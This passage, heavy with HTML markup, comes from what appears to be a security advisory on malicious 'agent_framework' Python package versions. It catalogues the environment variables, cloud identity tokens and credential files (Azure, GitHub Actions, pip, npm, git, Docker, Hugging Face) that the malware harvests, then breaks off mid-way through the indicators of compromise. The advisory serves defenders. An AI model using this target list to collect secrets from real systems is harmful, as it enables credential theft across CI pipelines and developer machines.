[a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">TENANT</code>, <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">CLIENT</code>, and <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">MANAGED</code>. Version <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">1.26.2</code> adds <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">ACTIONS</code>, <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">OIDC</code>, <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">RUNNER</code>, and <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">ARM_</code>.</li><li class="textStyle_article-body ff_inter c_text.primary li-t_disc"><strong class="fw_semibold">Other processes:</strong> <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">/proc/*/environ</code>, filtering for <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">TOKEN</code>, <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">SECRET</code>, <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">PASSWORD</code>, <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">KEY=</code>, <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">SYSTEM_ACCESSTOKEN</code>, and <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">IDENTITY_HEADER</code>; <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">1.26.2</code> also matches <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">ACTIONS_ID_TOKEN</code>.</li><li class="textStyle_article-body ff_inter c_text.primary li-t_disc"><strong class="fw_semibold">Azure and Azure DevOps:</strong><ul class="d_flex flex-d_column gap_xs pl_lg"><li class="textStyle_article-body ff_inter c_text.primary li-t_disc"><code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">IDENTITY_ENDPOINT</code> and identity headers; Azure IMDS managed-identity tokens.</li><li class="textStyle_article-body ff_inter c_text.primary li-t_disc"><code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">SYSTEM_ACCESSTOKEN</code> and <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">SYSTEM_OIDCREQUESTURI</code> for Azure DevOps federation tokens.</li><li class="textStyle_article-body ff_inter c_text.primary li-t_disc">Azure JSON files: <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">~/.azure/*.json</code>, <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">~/.azure/*/*.json</code> (both expanded with <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">os.path.expanduser</code>), <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">/home/*/.azure/*.json</code>, <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">/home/*/.azure/*/*.json</code>, and <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">/root/.azure/*.json</code>.</li><li class="textStyle_article-body ff_inter c_text.primary li-t_disc">Azure DevOps agent credential patterns in <strong class="fw_semibold">both versions</strong>:</li></ul></li></ul><div class="w_100%"><div class="d_flex ai_center jc_space-between gap_sm px_md py_sm bg_bg.base bd-b_1px_solid_{colors.border.ivoryLight}"><span class="textStyle_article-code-label ff_inter c_text.secondary"></span><button class="" aria-label="Copy command" type="button"><div class="d_flex ai_center jc_center w_20px h_20px c_text.secondary cursor_pointer trs_opacity trs-dur_fast trs-tmf_power3Out hover:op_0.7"><div aria-hidden="true" class="d_inline-block va_middle [&amp;_&gt;_:is(svg,_img)]:d_block [&amp;_&gt;_:is(svg,_img)]:w_100% [&amp;_&gt;_:is(svg,_img)]:h_auto"><svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24"><path d="M7 6V3a1 1 0 0 1 1-1h12a1 1 0 0 1 1 1v14a1 1 0 0 1-1 1h-3v3a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V7a1 1 0 0 1 1-1zM5 8v12h10V8zm4-2h8v10h2V4H9z"/></svg></div></div></button></div><pre class="p_md m_0 bg_bg.base c_syntax.plain ov-x_auto [&amp;_.hljs-comment,_&amp;_.hljs-quote,_&amp;_.hljs-meta]:c_syntax.comment [&amp;_.hljs-keyword,_&amp;_.hljs-selector-tag,_&amp;_.hljs-literal,_&amp;_.hljs-type,_&amp;_.hljs-name,_&amp;_.hljs-doctag]:c_syntax.keyword [&amp;_.hljs-string,_&amp;_.hljs-regexp,_&amp;_.hljs-addition,_&amp;_.hljs-symbol,_&amp;_.hljs-bullet,_&amp;_.hljs-template-tag]:c_syntax.string [&amp;_.hljs-number,_&amp;_.hljs-deletion]:c_syntax.number [&amp;_.hljs-title,_&amp;_.hljs-section,_&amp;_.hljs-built_in,_&amp;_.hljs-selector-id,_&amp;_.hljs-selector-class]:c_syntax.function [&amp;_.hljs-attr,_&amp;_.hljs-attribute,_&amp;_.hljs-variable,_&amp;_.hljs-template-variable]:c_syntax.property [&amp;_.hljs-emphasis]:font-style_italic [&amp;_.hljs-strong]:fw_semibold"><span class="textStyle_article-code ff_mono d_block"><code class="ff_inherit">/home/*/_work/*/.credentials
/home/*/*/_work/*/.credentials
/usr/local/vss-agent/*/.credentials
/vss-agent/*/.credentials
/home/*/.credentials
/mnt/azure_nvme_temp/_work/*/.credentials
/mnt/azure_nvme_temp/_work/*/*/.credentials</code></span></pre></div><ul class="d_flex flex-d_column gap_xs pl_lg"><li class="textStyle_article-body ff_inter c_text.primary li-t_disc"><strong class="fw_semibold"><code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">1.26.1</code></strong> also targets <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">/agent/_work/*/.credentials</code>.</li><li class="textStyle_article-body ff_inter c_text.primary li-t_disc">Token audiences include Azure management, AI/ML, Cognitive Services, Storage, Key Vault, Search, Microsoft Graph, Container Registry, Azure DevOps, and Azure AD token exchange.</li></ul><ul class="d_flex flex-d_column gap_xs pl_lg"><li class="textStyle_article-body ff_inter c_text.primary li-t_disc"><strong class="fw_semibold">GitHub Actions—expanded in <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">1.26.2</code>:</strong><ul class="d_flex flex-d_column gap_xs pl_lg"><li class="textStyle_article-body ff_inter c_text.primary li-t_disc"><code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">ACTIONS_ID_TOKEN_REQUEST_URL</code>, <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">ACTIONS_ID_TOKEN_REQUEST_TOKEN</code>, and fallback <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">ACTIONS_RUNTIME_TOKEN</code>.</li><li class="textStyle_article-body ff_inter c_text.primary li-t_disc">OIDC tokens for <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">api://AzureADTokenExchange</code> and <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">https://management.azure.com/</code>.</li><li class="textStyle_article-body ff_inter c_text.primary li-t_disc">Added file patterns: <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">/home/runner/work/_temp/*</code>, <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">/home/runner/.azure/*.json</code>, and <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">/home/runner/.azure/*/*.json</code>.</li></ul></li><li class="textStyle_article-body ff_inter c_text.primary li-t_disc"><strong class="fw_semibold">Other credential/configuration patterns—both versions:</strong><ul class="d_flex flex-d_column gap_xs pl_lg"><li class="textStyle_article-body ff_inter c_text.primary li-t_disc">pip: <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">/home/*/.config/pip/pip.conf</code>, <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">/etc/pip.conf</code>, <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">/home/*/.pip/pip.conf</code>.</li><li class="textStyle_article-body ff_inter c_text.primary li-t_disc">npm: <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">/home/*/.npmrc</code>, <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">/root/.npmrc</code>.</li><li class="textStyle_article-body ff_inter c_text.primary li-t_disc">netrc: <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">/home/*/.netrc</code>, <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">/root/.netrc</code>.</li><li class="textStyle_article-body ff_inter c_text.primary li-t_disc">Git: <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">/home/*/.git-credentials</code>, <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">/root/.git-credentials</code>.</li><li class="textStyle_article-body ff_inter c_text.primary li-t_disc">Docker: <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">/home/*/.docker/config.json</code>, <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">/root/.docker/config.json</code>.</li><li class="textStyle_article-body ff_inter c_text.primary li-t_disc">Hugging Face: <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">/home/*/.cache/huggingface/token</code>, <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">/home/*/.huggingface/token</code>.</li><li class="textStyle_article-body ff_inter c_text.primary li-t_disc">Foundry: <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">/home/*/.foundry/*</code>, <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">/home/*/.config/foundry/*</code>.</li><li class="textStyle_article-body ff_inter c_text.primary li-t_disc">Configuration tokens: <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">/home/*/.config/*/token*.json</code>, <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">/root/.config/*/token*.json</code>.</li><li class="textStyle_article-body ff_inter c_text.primary li-t_disc">Application files: <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">/app/.env</code>, <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">/app/*.env</code>, <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">/app/*.json</code>, <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">/workspace/.env</code>, <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">/workspace/*.json</code>.</li></ul></li></ul><div id="Indicators-of-Compromise" class="textStyle_display-xl ff_body c_text.primary mt_calc(40px_-_24px) scr-mt_calc(var(--site-header-offset)_+_24px) [&amp;_.article-anchor]:op_0 [&amp;_.article-anchor]:ms_xs [&amp;_.article-anchor]:c_text.secondary [&amp;_.article-anchor]:td_none [&amp;:hover_.article-anchor,_&amp;_.article-anchor:focus-visible]:op_1"><h2 class="ff_body d_inline">Indicators of Compromise</h2><a href="#Indicators-of-Compromise" class="article-anchor" aria-label="Permalink: Indicators of Compromise">#</a></div><p class="textStyle_article-body ff_inter c_text.primary">Files</p><p class="textStyle_article-body ff_inter c_text.primary"><code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">agent_framework-1.26.1-py3-none-any.whl</code></p><ul class="d_flex flex-d_column gap_xs pl_lg"><li class="textStyle_article-body ff_inter c_text.primary li-t_disc">SHA256: <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">d27fa34414e6201d5e